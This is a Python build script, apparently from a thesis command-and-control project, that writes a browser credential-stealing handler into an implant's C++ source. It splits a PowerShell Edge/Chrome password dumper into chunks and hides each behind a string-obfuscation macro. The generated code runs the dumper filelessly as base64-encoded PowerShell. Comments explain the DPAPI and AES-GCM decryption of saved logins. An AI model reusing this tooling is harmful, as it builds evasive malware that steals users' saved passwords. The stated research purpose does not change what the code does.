# One-shot generator: rebuilds HandleBrowser in src/c2.cpp from
# tests/browser_dump.ps1 (the tested script). Run: python tests/gen_browser_chunks.py
BS = chr(92)

script = open('tests/browser_dump.ps1', encoding='utf-8').read()
assert script.isascii(), 'script must be ASCII'
assert ('ChainingModeGCM' + BS + '0') in script, 'NUL-terminated mode string present'
assert 'dwInfoVersion = 1' in script, 'version field set'

# chunk at line boundaries, <=450 chars per chunk
lines = script.split(chr(10))
chunks, cur = [], ''
for ln in lines:
    cand = (cur + chr(10) + ln) if cur else ln
    if len(cand) + 2 > 450 and cur:
        chunks.append(cur + chr(10))   # keep the newline that separated the lines
        cur = ln
    else:
        cur = cand
if cur:
    chunks.append(cur)

def esc(s):
    s = s.replace(BS, BS + BS)
    s = s.replace('"', BS + '"')
    s = s.replace(chr(10), BS + 'n')
    return s

chunk_lines = []
for i, c in enumerate(chunks, 1):
    chunk_lines.append(f'    auto s{i} = XSW(L"{esc(c)}");')
join_expr = ' + '.join(f's{i}.str()' for i in range(1, len(chunks) + 1))

func = (
    '// =====================================================================\n'
    '//  BROWSER CREDENTIAL RECOVERY — Edge / Chrome  [MITRE T1555.003]\n'
    '// =====================================================================\n'
    '// Script below is generated from tests/browser_dump.ps1 (single source of\n'
    '// truth — regenerate these chunks after editing it). Stock-Windows pipeline:\n'
    '// winsqlite3.dll (System32) reads the copied Login Data; the os_crypt master\n'
    '// key from Local State is DPAPI-unprotected and used for AES-256-GCM on\n'
    '// v10/v11 blobs (bcrypt.dll); pre-v80 rows fall back to plain DPAPI.\n'
    '// Chrome >= 127 "v20" app-bound entries are detected and reported, not\n'
    '// decrypted — documented limitation for the thesis.\n'
    'static std::wstring HandleBrowser(const std::string& /*args*/) {\n'
    + chr(10).join(chunk_lines) + '\n'
    '    std::wstring wScript = std::wstring(s1.str())'
    + ('' if len(chunks) == 1 else ' + ' + ' + '.join(f's{i}.str()' for i in range(2, len(chunks) + 1))) + ';\n'
    '\n'
    '    std::string b64 = Base64Encode(reinterpret_cast<const BYTE' + chr(42) + '>(wScript.c_str()),\n'
    '                                   wScript.size() * sizeof(wchar_t));\n'
    '    std::wstring result = RunFilelessPS(b64);\n'
    '    return L"Browser data:' + BS + 'n" + result;\n'
    '}\n'
)

src = open('src/c2.cpp', encoding='utf-8').read()
banner = '// ====================================================================='
si_text = src.find('//  BROWSER CREDENTIAL')
ei_text = src.find('//  STUB HANDLERS')
assert si_text != -1 and ei_text != -1 and ei_text > si_text, (si_text, ei_text)
si = src.rfind(banner, 0, si_text)
ei = src.rfind(banner, 0, ei_text)
assert si >= 0 and ei > si, (si, ei)
src = src[:si] + func.rstrip(chr(10)) + chr(10) + chr(10) + src[ei:]
open('src/c2.cpp', 'w', encoding='utf-8', newline='').write(src)
print(f'HandleBrowser replaced: {len(chunks)} chunks, script {len(script)} chars')
